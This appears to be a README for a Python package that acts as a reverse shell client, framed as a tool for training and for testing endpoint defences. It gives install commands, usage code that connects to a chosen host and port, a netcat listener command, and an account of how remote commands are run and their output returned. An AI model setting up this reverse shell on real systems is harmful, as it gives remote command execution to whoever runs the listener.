# PythonharmlessReverseShell

**PythonharmlessReverseShell** is a minimal Python implementation of a reverse shell client, intended strictly for **educational**, **simulation**, or **defensive testing** purposes. It is designed to help security professionals and developers understand how reverse shell behavior might look in controlled environments — without causing harm.

> ⚠️ **Disclaimer:** This code is non-malicious, has no persistence, and does not attempt privilege escalation or obfuscation. Use it only in authorized environments. Misuse can lead to legal or disciplinary consequences.

---

## ⚙️ Use Case

This package is useful for:
- Simulating reverse shell behavior in lab environments
- Testing EDR/AV responses
- Demonstrating potential risks of Python-based payloads
- Educating SOC teams and developers on threat detection

---

## 📦 Installation

Install from [PyPI](https://pypi.org/project/PythonHarmlessReverseShell/):

```bash
pip install PythonHarmlessReverseShell
```

Or clone the repository manually:

```bash
git clone https://github.com/yourusername/PythonharmlessReverseShell.git
cd PythonharmlessReverseShell
```

---

## ⚙️ Usage

### In Python Code

```python
from PythonHarmlessReverseShell.main import reverse_shell_client, ReverseConfiguration

# Use default config (localhost:8089)
reverse_shell_client()

# Use custom config
config = ReverseConfiguration(host="192.168.1.100", port=9001)
reverse_shell_client(config)
```

### As a CLI Tool

You can run the reverse shell client with default settings using:

```bash
reverse-shell-client
```

This command connects to `127.0.0.1:8089` and starts listening for commands.

---

## 🔍 How It Works

1. Connects to a remote TCP server using the given host and port
2. Waits for a command to be received
3. Executes the command locally using `subprocess.getoutput`
4. Sends the result/output back to the server
5. Continues until receiving the command `exit`

---

## 🔐 Security Considerations
- This tool does **not** persist after execution
- It requires manual execution
- Useful for AV/EDR testing, not actual backdoor deployment
- Make sure you run this only in isolated and controlled systems

---

## 🔈 Example Listener (Netcat)

To test this, run the following **on your listener machine**:

```bash
nc -lvnp 8089
```
Then run the Python script on the target system.

---

## 🧱 Project Structure

```
PythonharmlessReverseShell/
├── PythonHarmlessReverseShell/
│   └── main.py
├── README.md
├── LICENSE
└── ...
```

---

## 🔐 Legal & Ethical Use

This project is provided **strictly for educational and authorized testing** purposes. Do **not** use this code in real-world attacks or against systems you do not own or have explicit permission to test.

---

## 📜 License

MIT License — see [LICENSE](LICENSE) file for details.

---

## 🤝 Contributing

Pull requests and suggestions are welcome for educational improvements or use-case extensions.

---

## 💬 Contact

Created by [Khalid Al-Amri](https://www.linkedin.com/in/khalidwalamri/) for awareness and red team simulations.
